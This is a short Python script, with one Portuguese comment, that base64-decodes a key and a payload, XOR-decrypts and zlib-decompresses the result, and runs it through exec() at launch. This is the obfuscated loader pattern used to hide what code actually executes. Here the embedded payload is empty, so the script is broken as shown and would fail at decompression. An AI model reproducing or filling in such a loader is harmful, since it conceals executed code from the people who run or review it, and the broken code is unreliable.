# -*- coding: utf-8 -*-
import base64, zlib
def _execute():
    k = base64.b64decode('hwYOPEChDy1aMYQgWdN4ftIjKvkGcKAwPf6eNR+p2b4=')
    d = base64.b64decode('')
    # Lógica de XOR corrigida para Python 3
    r = bytes([b ^ k[i % len(k)] for i, b in enumerate(d)])
    exec(zlib.decompress(r), globals())
if __name__ == '__main__':
    _execute()
